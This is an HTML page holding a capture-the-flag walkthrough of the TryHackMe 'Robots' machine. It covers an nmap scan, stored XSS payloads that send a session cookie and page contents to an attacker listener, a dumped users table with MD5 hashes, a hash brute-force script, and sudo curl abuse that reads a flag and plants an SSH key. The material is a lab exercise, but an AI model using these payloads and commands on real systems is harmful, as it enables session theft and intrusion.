@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Robots</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>:root{color-scheme:dark;--bg:#0d0f14;--panel:#13161d;--text:#e6e9f0;--muted:#9aa3b5;--line:#272c38;--accent:#7c83ff;--code:#0a0c10}*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,sans-serif;line-height:1.72}article{width:min(780px,calc(100% - 40px));margin:0 auto;padding:72px 0 120px}.eyebrow{color:var(--accent);font-size:.76rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase}.hero{margin-bottom:36px}.cover{width:100%;max-height:380px;object-fit:cover;border-radius:14px;margin-bottom:28px;border:1px solid var(--line)}h1{font-size:clamp(2.35rem,7vw,4.5rem);line-height:1.02;letter-spacing:-.055em;margin:.25em 0 .35em}h2{font-size:1.7rem;margin:2.4em 0 .6em;letter-spacing:-.025em}h3{font-size:1.15rem;margin:2em 0 .55em}p{margin:0 0 1.15em}code,pre{font-family:"JetBrains Mono",monospace}code{font-size:.88em;background:#1b1f29;padding:.14em .38em;border-radius:5px}pre{position:relative;margin:1.15em 0 1.35em;padding:18px 20px;background:var(--code);border:1px solid var(--line);border-radius:12px;color:#d7dae2;line-height:1.62;white-space:pre-wrap;overflow-wrap:anywhere;font-size:.84rem;overflow-x:auto}pre code{background:transparent;padding:0}.note,blockquote{margin:1.25em 0 1.65em;padding:15px 17px;border-left:3px solid var(--accent);background:var(--panel);border-radius:0 10px 10px 0;color:#cdd2df}figure{margin:1.5em 0}figure img{display:block;max-width:100%;border-radius:12px;border:1px solid var(--line)}figcaption{margin-top:.55em;color:var(--muted);font-size:.82rem;text-align:center}ul,ol{padding-left:1.3em}li{margin:.35em 0}hr{border:0;border-top:1px solid var(--line);margin:3em 0}a{color:#9ca2ff}.tok-const{color:#f0bd75}.important-text{color:#ff8f8f;font-weight:700}@media(max-width:620px){article{width:min(100% - 28px,780px);padding-top:42px}pre{font-size:.76rem;padding:15px}}</style>
+</head>
+<body>
+<article>
+<header class="hero"><img class="cover" src="assets/cover.jpg" alt="Robots cover"><div class="eyebrow">THM &middot; Hard &middot; Linux</div><h1>Robots</h1></header>
+<pre><code>root in /home/yoinkas 
+❯ nmap -sC -sV -vv -<span class="tok-const">T4</span> -p- 10.67.138.209 
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 05:52 -0500
+<span class="tok-const">NSE</span>: Loaded 158 scripts for scanning.
+<span class="tok-const">NSE</span>: Script Pre-scanning.
+<span class="tok-const">NSE</span>: Starting runlevel 1 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:52
+Completed <span class="tok-const">NSE</span> at 05:52, 0.00s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 2 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:52
+Completed <span class="tok-const">NSE</span> at 05:52, 0.00s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 3 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:52
+Completed <span class="tok-const">NSE</span> at 05:52, 0.00s elapsed
+Initiating Ping Scan at 05:52
+Scanning 10.67.138.209 [4 ports]
+Completed Ping Scan at 05:52, 0.06s elapsed (1 total hosts)
+Initiating Parallel <span class="tok-const">DNS</span> resolution of 1 host. at 05:52
+Completed Parallel <span class="tok-const">DNS</span> resolution of 1 host. at 05:52, 0.50s elapsed
+Initiating <span class="tok-const">SYN</span> Stealth Scan at 05:52
+Scanning 10.67.138.209 [65535 ports]
+Discovered open port 22/tcp on 10.67.138.209
+Discovered open port 80/tcp on 10.67.138.209
+Discovered open port 9000/tcp on 10.67.138.209
+Completed <span class="tok-const">SYN</span> Stealth Scan at 05:52, 15.29s elapsed (65535 total ports)
+Initiating Service scan at 05:52
+Scanning 3 services on 10.67.138.209
+Completed Service scan at 05:53, 11.11s elapsed (3 services on 1 host)
+<span class="tok-const">NSE</span>: Script scanning 10.67.138.209.
+<span class="tok-const">NSE</span>: Starting runlevel 1 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 1.10s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 2 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 0.13s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 3 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 0.00s elapsed
+Nmap scan report for 10.67.138.209
+Host is up, received timestamp-reply ttl 62 (0.030s latency).
+Scanned at 2026-11-18 05:52:36 <span class="tok-const">EST</span> for 27s
+Not shown: 65532 closed tcp ports (reset)
+<span class="tok-const">PORT</span>     <span class="tok-const">STATE</span> <span class="tok-const">SERVICE</span> <span class="tok-const">REASON</span>         <span class="tok-const">VERSION</span>
+22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 (protocol 2.0)
+80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.61
+| http-robots.txt: 3 disallowed entries 
+|_<span class="important-text">/harming/humans /ignoring/human/orders /harm/to/self</span>
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.61 (Debian)
+| http-methods: 
+|_  Supported Methods: <span class="tok-const">GET</span> <span class="tok-const">POST</span> <span class="tok-const">OPTIONS</span> <span class="tok-const">HEAD</span>
+9000/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: <span class="tok-const">OPTIONS</span> <span class="tok-const">HEAD</span> <span class="tok-const">GET</span> <span class="tok-const">POST</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: robots.thm
+
+
+<span class="tok-const">NSE</span>: Script Post-scanning.
+<span class="tok-const">NSE</span>: Starting runlevel 1 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 0.00s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 2 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 0.00s elapsed
+<span class="tok-const">NSE</span>: Starting runlevel 3 (of 3) scan.
+Initiating <span class="tok-const">NSE</span> at 05:53
+Completed <span class="tok-const">NSE</span> at 05:53, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 <span class="tok-const">IP</span> address (1 host up) scanned in 33.65 seconds
+           Raw packets sent: 65539 (2.884<span class="tok-const">MB</span>) | Rcvd: 65536 (2.621<span class="tok-const">MB</span>)</code></pre>
+
+<figure><img src="assets/image-01.png" alt=""><figcaption>Pasted 11/18/2026, 6:30:23 AM</figcaption></figure>
+
+<figure><img src="assets/image-02.png" alt=""><figcaption>Pasted 11/18/2026, 6:30:47 AM</figcaption></figure>
+<p>AN ADMIN MONITORS NEW USERS is an indicator that we can try and retrie</p>
+<p><br>We will try and register a new user</p>
+
+<figure><img src="assets/image-03.png" alt=""><figcaption>Pasted 11/18/2026, 6:32:54 AM</figcaption></figure>
+<p>we can see that it takes our username and date and month and md5 hashes it but lets see if we can enter some XSS to see if it can reveal something its not supposed to ..</p>
+<p>and setting up a listener&nbsp;<br></p>
+<pre><code>root in THM/MAChines/Robots via C v16.2.0-gcc 
+❯ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.67.138.209 - - [18/Nov/2026 06:40:12] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:40:42] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:40:42] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:41:12] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:41:12] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:41:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:41:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:41:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:41:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:41:43] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:41:43] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -</code></pre>
+<pre><code>&lt;script&gt;fetch(&#39;http://192.168.137.45:8000/xss-confirmed&#39;)&lt;/script&gt;</code></pre>
+<p>and then running this in the username field and entering in a birthday shows that is is confirmed a XSS vulnerability&nbsp;</p>
+<p>you will get a notification that it is too long&nbsp;&nbsp;</p>
+<pre><code>root in THM/MAChines/Robots via C v16.2.0-gcc 
+❯ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.67.138.209 - - [18/Nov/2026 06:44:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:44:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:44:13] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:44:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:44:43] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:44:43] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:44:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:44:43] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:44:43] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:44:43] code 414, message URI Too Long
+10.67.138.209 - - [18/Nov/2026 06:44:43] &quot;&quot; 414 -
+10.67.138.209 - - [18/Nov/2026 06:45:13] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:45:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:45:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:45:13] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:45:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:45:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:45:13] code 414, message URI Too Long
+10.67.138.209 - - [18/Nov/2026 06:45:13] &quot;&quot; 414 -
+10.67.138.209 - - [18/Nov/2026 06:45:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:45:43] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:45:43] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:45:43] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:45:43] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:45:43] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:45:43] code 414, message URI Too Long
+10.67.138.209 - - [18/Nov/2026 06:45:43] &quot;&quot; 414 -
+10.67.138.209 - - [18/Nov/2026 06:46:13] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:46:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:46:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:46:13] &quot;GET / HTTP/1.1&quot; 200 -
+10.67.138.209 - - [18/Nov/2026 06:46:13] code 404, message File not found
+10.67.138.209 - - [18/Nov/2026 06:46:13] &quot;GET /xss-confirmed HTTP/1.1&quot; 404 -
+10.67.138.209 - - [18/Nov/2026 06:46:13] code 414, message URI Too Long
+10.67.138.209 - - [18/Nov/2026 06:46:13] &quot;&quot; 414 -</code></pre>
+<pre><code>&lt;script&gt;fetch(&#39;/harm/to/self/server_info.php&#39;).then(r=&gt;r.text()).then(d=&gt;{let s=d.match(/PHPSESSID.*?([a-zA-Z0-9]{26})/);fetch(&#39;http://192.168.137.45:8000/?sess=&#39;+(s?s[1]:&#39;fail&#39;))})&lt;/script&gt;</code></pre>
+<div class="note"><strong>Note:</strong> Instead of sending the whole HTML page, this script fetches server_info.php, uses a regex to find the PHPSESSID value, and sends only that short string to your listener.</div>
+<pre><code>GET /?data=PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgIkRURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj48aGVhZD4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYm9keSB7YmFja2dyb3VuZC1jb2xvcjogI2ZmZjsgY29sb3I6ICMyMjI7IGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmO30KcHJlIHttYXJnaW46IDA7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7fQphOmxpbmsge2NvbG9yOiAjMDA5OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGJhY2tncm91bmQtY29sb3I6ICNmZmY7fQphOmhvdmVyIHt0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTt9CnRhYmxlIHtib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOyBib3JkZXI6IDA7IHdpZHRoOiA5MzRweDsgYm94LXNoYWRvdzogMXB4IDJweCAzcHggcmdiYSgwLCAwLCAwLCAwLjIpO30KLmNlbnRlciB7dGV4dC1hbGlnbjogY2VudGVyO30KLmNlbnRlciB0YWJsZSB7bWFyZ2luOiAxZW0gYXV0bzsgdGV4dC1hbGlnbjogbGVmdDt9Ci5jZW50ZXIgdGgge3RleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50O30KdGQsIHRoIHtib3JkZXI6IDFweCBzb2xpZCAjNjY2OyBmb250LXNpemU6IDc1JTsgdmVydGljYWwtYWxpZ246IGJhc2VsaW5lOyBwYWRkaW5nOiA0cHggNXB4O30KdGgge3Bvc2l0aW9uOiBzdGlja3k7IHRvcDogMDsgYmFja2dyb3VuZDogaW5oZXJpdDt9CmgxIHtmb250LXNpemU6IDE1MCU7fQpoMiB7Zm9udC1zaXplOiAxMjUlO30KaDIgYTpsaW5rLCBoMiBhOnZpc2l0ZWR7Y29sb3I6IGluaGVyaXQ7IGJhY2tncm91bmQ6IGluaGVyaXQ7fQoucCB7dGV4dC1hbGlnbjogbGVmdDt9Ci5lIHtiYWNrZ3JvdW5kLWNvbG9yOiAjY2NmOyB3aWR0aDogMzAwcHg7IGZvbnQtd2VpZ2h0OiBib2xkO30KLmgge2JhY2tncm91bmQtY29sb3I6ICM5OWM7IGZvbnQtd2VpZ2h0OiBib2xkO30KLnYge2JhY2tncm91bmQtY29sb3I6ICNkZGQ7IG1heC13aWR0aDogMzAwcHg7IG92ZXJmbG93LXg6IGF1dG87IHdvcmQtd3JhcDogYnJlYWstd29yZDt9Ci52IGkge2NvbG9yOiAjOTk5O30KaW1nIHtmbG9hdDogcmlnaHQ7IGJvcmRlcjogMDt9CmhyIHt3aWR0aDogOTM0cHg7IGJhY2tncm91bmQtY29sb3I6ICNjY2M7IGJvcmRlcjogMDsgaGVpZ2h0OiAxcHg7fQo6cm9vdCB7LS1waHAtZGFyay1ncmV5OiAjMzMzOyAtLXBocC1kYXJrLWJsdWU6ICM0RjVCOTM7IC0tcGhwLW1lZGl1bS1ibHVlOiAjODg5MkJGOyAtLXBocC1saWdodC1ibHVlOiAjRTJFNEVGOyAtLXBocC1hY2NlbnQtcHVycGxlOiAjNzkzODYyfUBtZWRpYSAocHJlZmVycy1jb2xvci1zY2hlbWU6IGRhcmspIHsKICBib2R5IHtiYWNrZ3JvdW5kOiB2YXIoLS1waHAtZGFyay1ncmV5KTsgY29sb3I6IHZhcigtLXBocC1saWdodC1ibHVlKX0KICAuaCB0ZCwgdGQuZSwgdGgge2JvcmRlci1jb2xvcjogIzYwNkE5MH0KICB0ZCB7Ym9yZGVyLWNvbG9yOiAjNTA1MTUzfQogIC5lIHtiYWNrZ3JvdW5kLWNvbG9yOiAjNDA0QTc3fQogIC5oIHtiYWNrZ3JvdW5kLWNvbG</code></pre>
+<p>and Boom it worked !!</p>
+<p>but what we are looking for is the session cookie so we were getting forbidden so now we input this session token and&nbsp;</p>
+<pre><code>-<div>10.67.138.209 - - [18/Nov/2026 06:50:44] "GET /?<span class="important-text">sess=3drp3a9j2ds4q867i122fsl0q7</span> HTTP/1.1" 200 -</div><div>10.67.138.209 - - [18/Nov/2026 06:50:44] code 414, message URI Too Long</div><div>10.67.138.209 - - [18/Nov/2026 06:50:44] "" 414 -</div><div>10.67.138.209 - - [18/Nov/2026 06:51:14] "GET / HTTP/1.1" 200 -</div><div>10.67.138.209 - - [18/Nov/2026 06:51:14] code 404, message File not found</div><div>10.67.138.209 - - [18/Nov/2026 06:51:14] "GET /xss-confirmed HTTP/1.1" 404 -</div><div><br></div></code></pre>
+<pre><code>s $row) { echo $row[0] . &quot;\n&quot;; }&#39;KvKwK4S&quot;); foreach($pdo-&gt;query(&quot;SHOW TABLES&quot;) as
+                                 logins
+                                       users
+                                            www-data@robots:/var/www/html/harm/to/self$ php -r &#39;$pdo=new PDO(&quot;mysql:sers&quot;) as $row) { print_r($row); }&#39;KwK4S&quot;); foreach($pdo-&gt;query(&quot;SELECT * FROM us
+                                   Array
+                                        (
+                                             [id] =&gt; 1
+                                                          [0] =&gt; 1
+                                                                      [username] =&gt; admin
+                                                                                             [1] =&gt; admin
+                                                                                                             [password] =&gt; 3e3d6c2d540d49b1a11cf74ac5a37233
+                                           [2] =&gt; 3e3d6c2d540d49b1a11cf74ac5a37233
+                                                                                      [group] =&gt; admin
+                                                                                                          [3] =&gt; admin
+  )
+   Array
+        (
+             [id] =&gt; 2
+                          [0] =&gt; 2
+                                      [username] =&gt; rgiskard
+                                                                [1] =&gt; rgiskard
+                                                                                   [password] =&gt; dfb35334bf2a1338fa40e5fbb4ae4753
+                 [2] =&gt; dfb35334bf2a1338fa40e5fbb4ae4753
+                                                            [group] =&gt; nologin
+                                                                                  [3] =&gt; nologin
+                                                                                                )
+                                                                                                 Array
+                                                                                                      (
+                                                                                                           [id] =&gt; 3
+    [0] =&gt; 3
+                [username] =&gt; &lt;script&gt;fetch(&#39;/harm/to/self/server_info.php&#39;).then(r=&gt;r.text()).then(d=&gt;{let s=d.match(/PHPSESSID.*?([a-zA-Z0-9]{26})/);fetch(&#39;http://192.168.137.45:8000/?sess=&#39;+(s?s[1]:&#39;fail&#39;))})&lt;/script&gt;
+                                                                                                            [1] =&gt; &lt;script&gt;fetch(&#39;/harm/to/self/server_info.php&#39;).then(r=&gt;r.text()).then(d=&gt;{let s=d.match(/PHPSESSID.*?([a-zA-Z0-9]{26})/);fetch(&#39;http://192.168.137.45:8000/?sess=&#39;+(s?s[1]:&#39;fail&#39;))})&lt;/script&gt;
+                                                                             [password] =&gt; 91ea36306af6324ebd01e65daf4f54c7
+           [2] =&gt; 91ea36306af6324ebd01e65daf4f54c7
+                                                      [group] =&gt; guest
+                                                                          [3] =&gt; guest
+                                                                                      )
+                                                                                       Array
+                                                                                            (
+                                                                                                 [id] =&gt; 6
+                                                                                                              [0] =&gt; 6
+      [username] =&gt; &lt;script&gt;fetch(&#39;http://192.168.137.45:8000/xss-confirmed&#39;)&lt;/script&gt;
+                                                                                          [1] =&gt; &lt;script&gt;fetch(&#39;http://192.168.137.45:8000/xss-confirmed&#39;)&lt;/script&gt;
+                                                   [password] =&gt; 1f2c4ba96176dc8ca735011cabf09ada
+                                                                                                     [2] =&gt; 1f2c4ba96176dc8ca735011cabf09ada
+                            [group] =&gt; guest
+                                                [3] =&gt; guest
+                                                            )
+                                                             Array
+                                                                  (
+                                                                       [id] =&gt; 7
+                                                                                    [0] =&gt; 7
+                                                                                                [username] =&gt; &lt;script&gt;fetch(&#39;/harm/to/self/server_info.php&#39;).then(r=&gt;r.text()).then(d=&gt;fetch(&#39;http://192.168.137.45:8000/?data=&#39;+btoa(d)))&lt;/script&gt;
+               [1] =&gt; &lt;script&gt;fetch(&#39;/harm/to/self/server_info.php&#39;).then(r=&gt;r.text()).then(d=&gt;fetch(&#39;http://192.168.137.45:8000/?data=&#39;+btoa(d)))&lt;/script&gt;
+                                           [password] =&gt; bd73cb8e7258b5a29cfb1eae04c86f09
+                                                                                             [2] =&gt; bd73cb8e7258b5a29cfb1eae04c86f09
+                    [group] =&gt; guest
+                                        [3] =&gt; guest
+                                                    )
+                                                     www-data@robots:/var/www/html/harm/to/self$</code></pre>
+
+<pre><code>www-data@robots:/var/www/html/harm/to/self$ cat login.php
+...
+if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {
+    $stmt = $pdo-&gt;prepare(&#39;SELECT * from users where (username= ? and password=md5(?) and `group` NOT LIKE &quot;nologin&quot;)&#39;);
+...</code></pre>
+<pre><code>#!/usr/bin/env python3
+
+
+from hashlib import md5
+
+
+for m in range(1, 13):
+	for d in range(1, 32):
+		plain = &quot;rgiskard&quot; + str(d).zfill(2) + str(m).zfill(2)
+		password = md5(plain.encode()).hexdigest()
+		hashed = md5(password.encode()).hexdigest()
+		if hashed == &quot;[REPLACE WITH THE HASH FROM THE DATABASE FOR THE RGISKARD USER]&quot;:
+			print(f&quot;Plain: {plain}, Password: {password}&quot;)
+			exit()</code></pre>
+<pre><code><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 via 🐍 v3.14.8 </div><div>❯ cat brute.py </div><div>#!/usr/bin/env python3</div><div><br></div><div>from hashlib import md5</div><div><br></div><div>for m in range(1, 13):</div><div>        for d in range(1, 32):</div><div>                plain = "rgiskard" + str(d).zfill(2) + str(m).zfill(2)</div><div>                password = md5(plain.encode()).hexdigest()</div><div>                hashed = md5(password.encode()).hexdigest()</div><div>                if hashed == "[dfb35334bf2a1338fa40e5fbb4ae4753]":</div><div>                        print(f"Plain: {plain}, Password: {password}")</div><div>                        exit()</div><div>                                                                                                                    </div><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 via 🐍 v3.14.8 </div><div>❯ nano brute.py</div><div>                                                                                                                    </div><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 via 🐍 v3.14.8 took 17s </div><div>❯ ./brute.py   </div><div><br></div><div>Plain: rgiskard2209, Password: <span class="important-text">b246f21ff68cae9503ed6d18edd32dae</span></div><div>                                                                                                                    </div><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 via 🐍 v3.14.8 </div><div>❯ </div><div><br></div></code></pre>
+<pre><code>rgiskard@ubuntu-jammy:/home$ sudo -l
+[sudo] password for rgiskard: 
+Matching Defaults entries for rgiskard on ubuntu-jammy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+
+User rgiskard may run the following commands on ubuntu-jammy:
+    (dolivaw) /usr/bin/curl 127.0.0.1/*</code></pre>
+<div class="note"><strong>Note:</strong> Because the sudoers rule allows curl, and curl can accept multiple URLs in one command, only the first URL has to be 127.0.0.1/. We can add a second URL using the file:// protocol, which curl also supports, to read the user flag directly.</div>
+<pre><code>rgiskard@ubuntu-jammy:/home$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don&#39;t have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+THM{9b17d3c3e86c944c868c57b5a7fa07d8}rgiskard@ubuntu-jammy:/home$</code></pre>
+<pre><code>me$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.137.45/id_ed25^C9.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys<div>rgiskard@ubuntu-jammy:/home$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.137.45/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys</div><div>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div>                                 Dload  Upload   Total   Spent    Left  Speed</div><div>100   274  100   274    0     0  51610      0 --:--:-- --:--:-- --:--:-- 54800</div><div>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div>                                 Dload  Upload   Total   Spent    Left  Speed</div><div>100    94  100    94    0     0   1144      0 --:--:-- --:--:-- --:--:--  1146</div><div>rgiskard@ubuntu-jammy:/home$ chmod 600 id_ed25519</div><div>ssh -i id_ed25519 dolivaw@robots.thm</div><div>chmod: cannot access 'id_ed25519': No such file or directory</div><div>Warning: Identity file id_ed25519 not accessible: No such file or directory.</div><div>ssh: Could not resolve hostname robots.thm: Name or service not known</div><div>rgiskard@ubuntu-jammy:/home$ ls</div><div>dolivaw  rgiskard  vagrant</div><div>rgiskard@ubuntu-jammy:/home$ cd /tmp</div><div>rgiskard@ubuntu-jammy:/tmp$ ls</div><div><span class="important-text">1 </span>                systemd-private-674856f1936d4f91a6266404158d9f55-apache2.service-sXzmPW         systemd-private-674856f1936d4f91a6266404158d9f55-systemd-resolved.service-YP5Wee</div><div>snap-private-tmp  systemd-private-674856f1936d4f91a6266404158d9f55-systemd-logind.service-EJfj8b  systemd-private-674856f1936d4f91a6266404158d9f55-systemd-timesyncd.service-xMxChm</div><div><br></div><div><br></div><div><br></div><div><br></div><div>                                                                                                                    </div><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 took 6m18s </div><div>❯  ssh -i id_ed25519 dolivaw@robots.thm</div><div>** WARNING: connection is not using a post-quantum key exchange algorithm.</div><div>** This session may be vulnerable to "store now, decrypt later" attacks.</div><div>** The server may need to be upgraded. See https://openssh.com/pq.html</div><div>dolivaw@ubuntu-jammy:~$ </div><div><br></div></code></pre>
+
+</article>
+</body>
+</html>
